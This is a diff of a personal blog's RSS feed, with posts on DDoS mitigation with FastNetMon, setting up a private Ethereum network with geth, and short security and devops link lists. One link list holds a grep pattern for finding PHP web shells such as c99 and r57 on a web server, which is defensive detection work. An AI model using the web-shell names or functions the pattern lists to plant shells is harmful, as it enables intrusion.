+<p>b) DNS Obfuscation/<strong>CDN Mitigation</strong>/Proxying only legit requests, a well-known example is CloudFlare  (Kinda like Security through Obfuscation.. and it works only if you have certain services and know your stuff.)<br></p>
+<ul>
+<li>Pros: If you only have HTTP(S) services exposed this is a great option and it's cheap or free.. (you can also setup your own private proxying with Nginx on some VPS/Cloud provider with DDoS protection). <br></li>
+<li>Cons: Doesn't work well if you have other exposed services like Email servers,FTP or any dedicated exposed network assigned to you (Example.. if you are a Carrier you can't just hide your site using DNS since they will hit your announced AS networks...)
+<br><br><br></li>
+</ul>
+<p>c) <strong>Layer 6-7 mitigation</strong> using server/service side counter-measures (enabling Nginx rate limiting, Cache filtering, Apache mod<em>security &#x26; mod</em>evasive bans ..)<br></p>
+<ul>
+<li>Pros: Easily to configure and some low-end attacks can be mitigated (example: Website scans, Automated Bots/Aggressive crawlers..)<br></li>
+<li>Cons: A real attack will saturate your uplink and bring you down all your services<br><br><br></li>
+</ul>
+<p>d) <strong>DIY DDoS protection</strong> using Linux boxes and the good old packet filter.<br></p>
+<ul>
+<li>Pros: It's free, it just works, you need only to create your own "patterns" and attack/network blacklists.<br></li>
+<li>Cons: You need to have at least 100G Uplinks and expesive dedicated servers to process all fast incoming/outgoing traffic, you have to manage all the network issues your self and if you saturate your links with the upstream BGP provider they may drop your traffic and/or blackhole you anyways as no one wants unwanted bandwidth costs &#x26; saturated links by malicious traffic or bogus packets.<br><br><br></li>
+</ul>
+<p>Before do you even think of option d) watch this:<br><br>
+<img src="https://github.com/fnzv/fnzv.github.io/blob/beedd3afa60078ac41b7b574738a22f690bec90a/ddos-fish.gif?raw=true">
+<br><br></p>
+<p>Cool, but how i detect attacks?  Well if you have $$ and you only believe enterprise stuff <br><br>
+--> grab that 500+ grand network box and put it in front of your DC... whereas if you are an opensource guy you can go for FastNetMon (By Pavel Odintsov) and setup your own Anti-DDoS detection/mitigation solution.<br>
+<br><br></p>
+<h4>What is FastNetMon?<br><br></h4>
+<p>FastNetMon is <strong>DDoS analyzer</strong> that will let you to detect nearly realtime attacks or suspicious traffic (example: VPS X is compromised and starts doing SYN Flood vs outbound nets --> detected and alerted by FNM), FNM isn't just a <br>
+detection tool but also helps to mitigate attacks, after the ban rule is triggered a bash script is being executed (there are also a lot of 'extra' stuff to do.. Slack webhooks..Keep a track of Influx metircs..Email Alerts...Send an emergency call/SMS..BGP Announce...Shutoff the VPS)<br>
+<br><br>
+Scenario 1:<br>
+VPS provider on Hypervisor X protects customers with FNM and when an attacks is detected on NetFlow/sFlow/IPFIX traffic the bash script automatically adds a blackhole rule on edge network device/hypervisor host to avoid degrading network performance for
+other customers<br>
+<br>
+Scenario 2:<br>
+Carrier needs to monitor traffic flows on their network boxes, Set ups FNM and gather all flows to monitor subnets to re-route traffic (GoBGP &#x26; ExaBGP are supported by FNM) when links are saturated<br>
+<br>
+..<br>
+...<br>
+<br>
+And so on<br>
+<br></p>
+<p>The FNM setup is quite easy to get up and running, the tricky part is setting up Grafana,Influxdb metrics but that's not a problem if you are interested only in detection/mitigation.<br>
+If you are into dashboarding you could also set up an ELK (this is the icing on the cake) to gather NetFlow data and create great visualization with Kibana (Total PPS in, Top "Talkers" on outgoing/incoming traffic, Traffic Categories, Sort by TCP/UDP..). <br><br></p>
+<p>The only requirements are:<br></p>
+<ul>
+<li>Small Server/Virtual Machine that will recieve all the flow traffic from routers/switches via a <a href="https://github.com/pavel-odintsov/fastnetmon/blob/master/docs/CAPTURE_BACKENDS.md">capture backend</a><br></li>
+<li>For automated BGP integration you need to allow the Server to talk directly to the routers/switches<br>
+<br></li>
+</ul>
+<p>Links and Resources:<br></p>
+<ul>
+<li><a href="https://github.com/pavel-odintsov/fastnetmon/tree/master/docs">Github documentation</a><br></li>
+<li><a href="https://fastnetmon.com/">FastNetMon site</a> (Thank you Pavel for this project) <br></li>
+<li><a href="http://pmacct.net/">Managing Flows</a> (Great tool from Paolo Lucente) if you want to collect properly flows you can use nfacct <br><br></li>
+</ul>
+<p>For any question &#x26; discussion don't esitate contact me <br><br></p>]]></description><link>https://sami.pw/blog/2017-08-19-how-to-detect-ddos</link><guid isPermaLink="false">https://sami.pw/blog/2017-08-19-how-to-detect-ddos</guid><pubDate>Sat, 19 Aug 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/fnzv/fnzv.github.io/5653b21f4114429a5bddf86aaed7891fb3a1e542/imgs/ddos-warz.gif&quot;&gt;
+Recently i was researching a lot on the various denial of service attacks and how to mitigate them from Layer 1 to 7 and as always the most convinient way to stop any attacks is keeping the bad requests/traffic away from your services starting from the first layers of the ISO/OSI model.&lt;br&gt;&lt;/p&gt;
+&lt;h4&gt;Realistically the only ways to prevent DDoS attacks are:&lt;br&gt;&lt;/h4&gt;
+&lt;p&gt;a) Layer 3-4 mitigation with &lt;strong&gt;BGP/Cloud&lt;/strong&gt; Scrubbing (Sending all your network traffic using BGP or &apos;sophisticated&apos; VPNs to third-party POP&apos;s to delegate attack mitigation).&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Pros: This is the only and smart way to properly mitigating attacks, your services won&apos;t be hit by attacks/malicious traffic.&lt;/li&gt;
+&lt;li&gt;Cons: Paying an External Provider &amp;#x26; bandwidth costs, All your traffic is re-routed so latency, packetloss and any other network issue that could happen to the External Provider affects you directly....And yes there could be false positives and customers may be locked out of their services.&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;b) DNS Obfuscation/&lt;strong&gt;CDN Mitigation&lt;/strong&gt;/Proxying only legit requests, a well-known example is CloudFlare  (Kinda like Security through Obfuscation.. and it works only if you have certain services and know your stuff.)&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Pros: If you only have HTTP(S) services exposed this is a great option and it&apos;s cheap or free.. (you can also setup your own private proxying with Nginx on some VPS/Cloud provider with DDoS protection). &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Cons: Doesn&apos;t work well if you have other exposed services like Email servers,FTP or any dedicated exposed network assigned to you (Example.. if you are a Carrier you can&apos;t just hide your site using DNS since they will hit your announced AS networks...)
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;c) &lt;strong&gt;Layer 6-7 mitigation&lt;/strong&gt; using server/service side counter-measures (enabling Nginx rate limiting, Cache filtering, Apache mod&lt;em&gt;security &amp;#x26; mod&lt;/em&gt;evasive bans ..)&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Pros: Easily to configure and some low-end attacks can be mitigated (example: Website scans, Automated Bots/Aggressive crawlers..)&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Cons: A real attack will saturate your uplink and bring you down all your services&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;d) &lt;strong&gt;DIY DDoS protection&lt;/strong&gt; using Linux boxes and the good old packet filter.&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Pros: It&apos;s free, it just works, you need only to create your own &quot;patterns&quot; and attack/network blacklists.&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Cons: You need to have at least 100G Uplinks and expesive dedicated servers to process all fast incoming/outgoing traffic, you have to manage all the network issues your self and if you saturate your links with the upstream BGP provider they may drop your traffic and/or blackhole you anyways as no one wants unwanted bandwidth costs &amp;#x26; saturated links by malicious traffic or bogus packets.&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Before do you even think of option d) watch this:&lt;br&gt;&lt;br&gt;
+&lt;img src=&quot;https://github.com/fnzv/fnzv.github.io/blob/beedd3afa60078ac41b7b574738a22f690bec90a/ddos-fish.gif?raw=true&quot;&gt;
+&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Cool, but how i detect attacks?  Well if you have $$ and you only believe enterprise stuff &lt;br&gt;&lt;br&gt;
+--&gt; grab that 500+ grand network box and put it in front of your DC... whereas if you are an opensource guy you can go for FastNetMon (By Pavel Odintsov) and setup your own Anti-DDoS detection/mitigation solution.&lt;br&gt;
+&lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;h4&gt;What is FastNetMon?&lt;br&gt;&lt;br&gt;&lt;/h4&gt;
+&lt;p&gt;FastNetMon is &lt;strong&gt;DDoS analyzer&lt;/strong&gt; that will let you to detect nearly realtime attacks or suspicious traffic (example: VPS X is compromised and starts doing SYN Flood vs outbound nets --&gt; detected and alerted by FNM), FNM isn&apos;t just a &lt;br&gt;
+detection tool but also helps to mitigate attacks, after the ban rule is triggered a bash script is being executed (there are also a lot of &apos;extra&apos; stuff to do.. Slack webhooks..Keep a track of Influx metircs..Email Alerts...Send an emergency call/SMS..BGP Announce...Shutoff the VPS)&lt;br&gt;
+&lt;br&gt;&lt;br&gt;
+Scenario 1:&lt;br&gt;
+VPS provider on Hypervisor X protects customers with FNM and when an attacks is detected on NetFlow/sFlow/IPFIX traffic the bash script automatically adds a blackhole rule on edge network device/hypervisor host to avoid degrading network performance for
+other customers&lt;br&gt;
+&lt;br&gt;
+Scenario 2:&lt;br&gt;
+Carrier needs to monitor traffic flows on their network boxes, Set ups FNM and gather all flows to monitor subnets to re-route traffic (GoBGP &amp;#x26; ExaBGP are supported by FNM) when links are saturated&lt;br&gt;
+&lt;br&gt;
+..&lt;br&gt;
+...&lt;br&gt;
+&lt;br&gt;
+And so on&lt;br&gt;
+&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;The FNM setup is quite easy to get up and running, the tricky part is setting up Grafana,Influxdb metrics but that&apos;s not a problem if you are interested only in detection/mitigation.&lt;br&gt;
+If you are into dashboarding you could also set up an ELK (this is the icing on the cake) to gather NetFlow data and create great visualization with Kibana (Total PPS in, Top &quot;Talkers&quot; on outgoing/incoming traffic, Traffic Categories, Sort by TCP/UDP..). &lt;br&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;The only requirements are:&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Small Server/Virtual Machine that will recieve all the flow traffic from routers/switches via a &lt;a href=&quot;https://github.com/pavel-odintsov/fastnetmon/blob/master/docs/CAPTURE_BACKENDS.md&quot;&gt;capture backend&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;For automated BGP integration you need to allow the Server to talk directly to the routers/switches&lt;br&gt;
+&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Links and Resources:&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/pavel-odintsov/fastnetmon/tree/master/docs&quot;&gt;Github documentation&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://fastnetmon.com/&quot;&gt;FastNetMon site&lt;/a&gt; (Thank you Pavel for this project) &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://pmacct.net/&quot;&gt;Managing Flows&lt;/a&gt; (Great tool from Paolo Lucente) if you want to collect properly flows you can use nfacct &lt;br&gt;&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For any question &amp;#x26; discussion don&apos;t esitate contact me &lt;br&gt;&lt;br&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Building a Private Blockchain with Ethereum]]></title><description><![CDATA[<p>As title says this is a summary on how to setup your private Blockchain with Ethereum <br><br>
+Requirements:<br></p>
+<ul>
+<li>2+ Ubuntu 16 servers/vps or locally on your computer <br></li>
+<li>Geth<br></li>
+</ul>
+<p>Difficulty level: CTRL+C/CTRL+V a.k.a DigitalOcean style<br></p>
+<ol>
+<li>Install Ethereum (with repo):<br></li>
+</ol>
+<h4>sudo apt-get install software-properties-common<br></h4>
+<h4>sudo add-apt-repository -y ppa:ethereum/ethereum<br></h4>
+<h4>sudo apt-get update<br></h4>
+<h4>sudo apt-get install ethereum</h4>
+<br>
+2) Create an Ethereum Account/Address:<br>
+<h4>geth account new</h4>
+<br>
+Output:<br>
+root@eth-01:/home/ubuntu# geth account new<br>
+WARN [07-04|21:27:58] No etherbase set and no accounts found as default<br>
+Your new account is locked with a password. Please give a password. Do not forget this password.<br>
+Passphrase:<br>
+Repeat passphrase:<br>
+Address: {YOUR ETHEREUM ADDRESS}<br>
+<br>
+<ol start="3">
+<li>
+<p>Generate the 'Genesis' block of your blockchain with:<br></p>
+<h4>geth init genesis.json<br><br></h4>
+<p>genesis.json format is:<br>
+{<br>
+"config": {<br>
+"chainId": 13,<br>
+"homesteadBlock": 0,<br>
+"eip155Block": 0,<br>
+"eip158Block": 0<br>
+},<br><br>
+"difficulty": "200000000",<br>
+"gasLimit": "2100000",<br>
+"alloc": {<br>
+"{YOUR ETHEREUM ADDRESS GENERATED FROM ABOVE": { "balance": "100000000" }<br>
+}<br>
+}<br></p>
+</li>
+</ol>
+<p>NOTE:
+On "chainId" put your networkid <br></p>
+<ol start="3">
+<li>Run the first node with (networkid must be different from (1=Frontier, 2=Morden (disused), 3=Ropsten and 4) :</li>
+</ol>
+<h4>geth --datadir="/tmp/eth01" -verbosity 6 --port 30301 --networkid 13 --nodiscover console</h4>
+<p>You can run this command under screen/NOHUP or any other way to keep it on background (pls not systemd).<br></p>
+<p>NOTE:
+All the nodes must start the blockchain from the same genesis.json file (The first block).<br></p>
+<p>To dinamically add other nodes you must follow the same steps from above (install eth, genesis from same block &#x26; run node on same net id) then add the node as an Admin peer with: <br></p>
+<p>From the geth console run this to get your node public key: <br></p>
+<h4>admin.nodeInfo.enode</h4>
+<p>Output:<br></p>
+<p>"enode://0e6b3bf7242d5c731e3da325eb7a2c2bd08be3acecf701d410a70043110a491e8b93f05b97222040b27aa6e32fb0fea05d3572e069f646a5b0c793695f9e1f52@[::]:30301?discport=0"</p>
+<p>This is your public-key@ip:30303 and its the identifier for the node, to make the nodes see eachother you need to add them as peers with:<br></p>
+<h4>admin.addPeer("enode://public-key@ip:30303")</h4>
+<br>
+How to check if peers are UP: <br>
+<h4>net.peerCount</h4>
+<p>or</p>
+<h4>admin.peers</h4>
+<br>
+<p>How to add statically Admin Peers:
+Create a .json file inside the data dir with all the public-keys of the nodes that are allowed on the multi-node private blockchain, in this case:<br>
+/tmp/eth01/static-nodes.json</p>
+<p>Format:</p>
+<p>[
+"enode://pubkey@ip-of-other-node:port" ,
+"enode://pubkey@ip-of-other-node2:port"
+]</p>
+<br>
+Your blockchain is ready for transactions/testing/development
+<br>
+<p>Tested on multiple Ubuntu instances, for testing purposes you can also run multiple nodes on the same host or locally on your computer just change ports or you will get binding errors/exceptions.<br></p>
+<p>Make sure the Ethereum nodes can see eachother on port 30303 (Test with telnet) locally or via wan.<br>
+<br></p>]]></description><link>https://sami.pw/blog/2017-07-04-bulding-a-blockchain</link><guid isPermaLink="false">https://sami.pw/blog/2017-07-04-bulding-a-blockchain</guid><pubDate>Tue, 04 Jul 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;As title says this is a summary on how to setup your private Blockchain with Ethereum &lt;br&gt;&lt;br&gt;
+Requirements:&lt;br&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2+ Ubuntu 16 servers/vps or locally on your computer &lt;br&gt;&lt;/li&gt;
+&lt;li&gt;Geth&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Difficulty level: CTRL+C/CTRL+V a.k.a DigitalOcean style&lt;br&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Install Ethereum (with repo):&lt;br&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4&gt;sudo apt-get install software-properties-common&lt;br&gt;&lt;/h4&gt;
+&lt;h4&gt;sudo add-apt-repository -y ppa:ethereum/ethereum&lt;br&gt;&lt;/h4&gt;
+&lt;h4&gt;sudo apt-get update&lt;br&gt;&lt;/h4&gt;
+&lt;h4&gt;sudo apt-get install ethereum&lt;/h4&gt;
+&lt;br&gt;
+2) Create an Ethereum Account/Address:&lt;br&gt;
+&lt;h4&gt;geth account new&lt;/h4&gt;
+&lt;br&gt;
+Output:&lt;br&gt;
+root@eth-01:/home/ubuntu# geth account new&lt;br&gt;
+WARN [07-04|21:27:58] No etherbase set and no accounts found as default&lt;br&gt;
+Your new account is locked with a password. Please give a password. Do not forget this password.&lt;br&gt;
+Passphrase:&lt;br&gt;
+Repeat passphrase:&lt;br&gt;
+Address: {YOUR ETHEREUM ADDRESS}&lt;br&gt;
+&lt;br&gt;
+&lt;ol start=&quot;3&quot;&gt;
+&lt;li&gt;
+&lt;p&gt;Generate the &apos;Genesis&apos; block of your blockchain with:&lt;br&gt;&lt;/p&gt;
+&lt;h4&gt;geth init genesis.json&lt;br&gt;&lt;br&gt;&lt;/h4&gt;
+&lt;p&gt;genesis.json format is:&lt;br&gt;
+{&lt;br&gt;
+&quot;config&quot;: {&lt;br&gt;
+&quot;chainId&quot;: 13,&lt;br&gt;
+&quot;homesteadBlock&quot;: 0,&lt;br&gt;
+&quot;eip155Block&quot;: 0,&lt;br&gt;
+&quot;eip158Block&quot;: 0&lt;br&gt;
+},&lt;br&gt;&lt;br&gt;
+&quot;difficulty&quot;: &quot;200000000&quot;,&lt;br&gt;
+&quot;gasLimit&quot;: &quot;2100000&quot;,&lt;br&gt;
+&quot;alloc&quot;: {&lt;br&gt;
+&quot;{YOUR ETHEREUM ADDRESS GENERATED FROM ABOVE&quot;: { &quot;balance&quot;: &quot;100000000&quot; }&lt;br&gt;
+}&lt;br&gt;
+}&lt;br&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;NOTE:
+On &quot;chainId&quot; put your networkid &lt;br&gt;&lt;/p&gt;
+&lt;ol start=&quot;3&quot;&gt;
+&lt;li&gt;Run the first node with (networkid must be different from (1=Frontier, 2=Morden (disused), 3=Ropsten and 4) :&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4&gt;geth --datadir=&quot;/tmp/eth01&quot; -verbosity 6 --port 30301 --networkid 13 --nodiscover console&lt;/h4&gt;
+&lt;p&gt;You can run this command under screen/NOHUP or any other way to keep it on background (pls not systemd).&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;NOTE:
+All the nodes must start the blockchain from the same genesis.json file (The first block).&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;To dinamically add other nodes you must follow the same steps from above (install eth, genesis from same block &amp;#x26; run node on same net id) then add the node as an Admin peer with: &lt;br&gt;&lt;/p&gt;
+&lt;p&gt;From the geth console run this to get your node public key: &lt;br&gt;&lt;/p&gt;
+&lt;h4&gt;admin.nodeInfo.enode&lt;/h4&gt;
+&lt;p&gt;Output:&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&quot;enode://0e6b3bf7242d5c731e3da325eb7a2c2bd08be3acecf701d410a70043110a491e8b93f05b97222040b27aa6e32fb0fea05d3572e069f646a5b0c793695f9e1f52@[::]:30301?discport=0&quot;&lt;/p&gt;
+&lt;p&gt;This is your public-key@ip:30303 and its the identifier for the node, to make the nodes see eachother you need to add them as peers with:&lt;br&gt;&lt;/p&gt;
+&lt;h4&gt;admin.addPeer(&quot;enode://public-key@ip:30303&quot;)&lt;/h4&gt;
+&lt;br&gt;
+How to check if peers are UP: &lt;br&gt;
+&lt;h4&gt;net.peerCount&lt;/h4&gt;
+&lt;p&gt;or&lt;/p&gt;
+&lt;h4&gt;admin.peers&lt;/h4&gt;
+&lt;br&gt;
+&lt;p&gt;How to add statically Admin Peers:
+Create a .json file inside the data dir with all the public-keys of the nodes that are allowed on the multi-node private blockchain, in this case:&lt;br&gt;
+/tmp/eth01/static-nodes.json&lt;/p&gt;
+&lt;p&gt;Format:&lt;/p&gt;
+&lt;p&gt;[
+&quot;enode://pubkey@ip-of-other-node:port&quot; ,
+&quot;enode://pubkey@ip-of-other-node2:port&quot;
+]&lt;/p&gt;
+&lt;br&gt;
+Your blockchain is ready for transactions/testing/development
+&lt;br&gt;
+&lt;p&gt;Tested on multiple Ubuntu instances, for testing purposes you can also run multiple nodes on the same host or locally on your computer just change ports or you will get binding errors/exceptions.&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;Make sure the Ethereum nodes can see eachother on port 30303 (Test with telnet) locally or via wan.&lt;br&gt;
+&lt;br&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Interesting Stuff 0x08]]></title><description><![CDATA[<p><strong>RFC Humor</strong>
+<a target="_blank" href="http://rfc-humor.com/">http://rfc-humor.com/</a><br><br>
+<strong>Linkerd</strong> Reverse proxy for microservices
+<a target="_blank" href="https://linkerd.io/">https://linkerd.io/</a><br><br>
+<strong>Are You Load Balancing Wrong?</strong>
+<a target="_blank" href="http://queue.acm.org/detail.cfm?id=3028689">http://queue.acm.org/detail.cfm?id=3028689</a><br><br></p>]]></description><link>https://sami.pw/blog/2017-01-08-interesting-stuff-0x08</link><guid isPermaLink="false">https://sami.pw/blog/2017-01-08-interesting-stuff-0x08</guid><pubDate>Sun, 08 Jan 2017 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;RFC Humor&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://rfc-humor.com/&quot;&gt;http://rfc-humor.com/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+&lt;strong&gt;Linkerd&lt;/strong&gt; Reverse proxy for microservices
+&lt;a target=&quot;_blank&quot; href=&quot;https://linkerd.io/&quot;&gt;https://linkerd.io/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+&lt;strong&gt;Are You Load Balancing Wrong?&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://queue.acm.org/detail.cfm?id=3028689&quot;&gt;http://queue.acm.org/detail.cfm?id=3028689&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Interesting Stuff 0x07]]></title><description><![CDATA[<p><strong>The Public Cloud: A Defense </strong>
+<a target="_blank" href="http://benbobsworld.blogspot.it/2016/12/the-public-cloud-defense.html">http://benbobsworld.blogspot.it/2016/12/the-public-cloud-defense.html</a><br><br>
+<strong>DBShield</strong>, An interesting SQL proxy against SQLi
+<a target="_blank" href="https://nim4.github.io/DBShield/">https://nim4.github.io/DBShield/</a><br><br>
+<strong>TLD glue sticks around too long</strong>
+<a target="_blank" href="https://blog.cloudflare.com/tld-glue-sticks-around-too-long/">https://blog.cloudflare.com/tld-glue-sticks-around-too-long/</a><br><br></p>]]></description><link>https://sami.pw/blog/2016-12-25-interesting-stuff-0x07</link><guid isPermaLink="false">https://sami.pw/blog/2016-12-25-interesting-stuff-0x07</guid><pubDate>Sun, 25 Dec 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;The Public Cloud: A Defense &lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://benbobsworld.blogspot.it/2016/12/the-public-cloud-defense.html&quot;&gt;http://benbobsworld.blogspot.it/2016/12/the-public-cloud-defense.html&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+&lt;strong&gt;DBShield&lt;/strong&gt;, An interesting SQL proxy against SQLi
+&lt;a target=&quot;_blank&quot; href=&quot;https://nim4.github.io/DBShield/&quot;&gt;https://nim4.github.io/DBShield/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+&lt;strong&gt;TLD glue sticks around too long&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;https://blog.cloudflare.com/tld-glue-sticks-around-too-long/&quot;&gt;https://blog.cloudflare.com/tld-glue-sticks-around-too-long/&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Interesting Stuff 0x06]]></title><description><![CDATA[<p><strong>Skydive</strong>
+<a target="_blank" href="http://skydive-project.github.io/skydive/">http://skydive-project.github.io/skydive/</a><br><br>
+<strong>Crontab Guru</strong>
+<a target="_blank" href="https://crontab.guru/">https://crontab.guru/</a><br><br>
+<strong>Wrap API</strong>
+<a target="_blank" href="https://wrapapi.com/">https://wrapapi.com/#</a><br><br></p>]]></description><link>https://sami.pw/blog/2016-12-17-interesting-stuff-0x06</link><guid isPermaLink="false">https://sami.pw/blog/2016-12-17-interesting-stuff-0x06</guid><pubDate>Sat, 17 Dec 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;Skydive&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://skydive-project.github.io/skydive/&quot;&gt;http://skydive-project.github.io/skydive/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+&lt;strong&gt;Crontab Guru&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;https://crontab.guru/&quot;&gt;https://crontab.guru/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+&lt;strong&gt;Wrap API&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;https://wrapapi.com/&quot;&gt;https://wrapapi.com/#&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Interesting Stuff 0x05]]></title><description><![CDATA[<p><strong>SSH Hacks</strong>
+<a target="_blank" href="http://matt.might.net/articles/ssh-hacks/">http://matt.might.net/articles/ssh-hacks/</a><br><br>
+Secure System Configurations by <strong>Team Cymru</strong>
+<a target="_blank" href="http://www.team-cymru.org/templates/all-templates.html">http://www.team-cymru.org/templates/all-templates.html</a><br><br>
+Project Shield (Anti-DDOS based on GCP) by <strong>Google</strong>
+<a target="_blank" href="https://projectshield.withgoogle.com/public/">https://projectshield.withgoogle.com/public/</a><br><br></p>]]></description><link>https://sami.pw/blog/2016-12-03-interesting-stuff-0x05</link><guid isPermaLink="false">https://sami.pw/blog/2016-12-03-interesting-stuff-0x05</guid><pubDate>Sat, 03 Dec 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;SSH Hacks&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://matt.might.net/articles/ssh-hacks/&quot;&gt;http://matt.might.net/articles/ssh-hacks/&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+Secure System Configurations by &lt;strong&gt;Team Cymru&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;http://www.team-cymru.org/templates/all-templates.html&quot;&gt;http://www.team-cymru.org/templates/all-templates.html&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+Project Shield (Anti-DDOS based on GCP) by &lt;strong&gt;Google&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;https://projectshield.withgoogle.com/public/&quot;&gt;https://projectshield.withgoogle.com/public/&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Interesting Stuff 0x04]]></title><description><![CDATA[<p><strong>My-Gray-Hacker-Resources</strong> by bt3gl
+<a target="_blank" href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a><br><br>
+Finding Most common <strong>PHP Shells</strong> on sites
+grep -RPn "(passthru|shell<em>exec|c99|r57|system|base64</em>decode|fopen|fclose|eval)" /var/www/html/ | zless<br><br>
+Generating security reports with <strong>Serpico</strong>
+<a target="_blank" href="https://github.com/SerpicoProject/Serpico">https://github.com/SerpicoProject/Serpico</a><br><br><br><br>
+No one is really safe so better start off with security through obscurity rather than nothing.</p>]]></description><link>https://sami.pw/blog/2016-11-26-interesting-stuff-0x04</link><guid isPermaLink="false">https://sami.pw/blog/2016-11-26-interesting-stuff-0x04</guid><pubDate>Sat, 26 Nov 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;My-Gray-Hacker-Resources&lt;/strong&gt; by bt3gl
+&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/bt3gl/My-Gray-Hacker-Resources&quot;&gt;https://github.com/bt3gl/My-Gray-Hacker-Resources&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+Finding Most common &lt;strong&gt;PHP Shells&lt;/strong&gt; on sites
+grep -RPn &quot;(passthru|shell&lt;em&gt;exec|c99|r57|system|base64&lt;/em&gt;decode|fopen|fclose|eval)&quot; /var/www/html/ | zless&lt;br&gt;&lt;br&gt;
+Generating security reports with &lt;strong&gt;Serpico&lt;/strong&gt;
+&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/SerpicoProject/Serpico&quot;&gt;https://github.com/SerpicoProject/Serpico&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+No one is really safe so better start off with security through obscurity rather than nothing.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Interesting Stuff 0x03]]></title><description><![CDATA[<p><a target="_blank" href="https://circleci.com/blog/its-the-future/">https://circleci.com/blog/its-the-future/</a> - "It's The <strong>Future</strong>" <br><br>
+<a target="_blank" href="https://github.com/yarrick/pingfs">https://github.com/yarrick/pingfs</a> - <strong>PingFS</strong> <br><br>
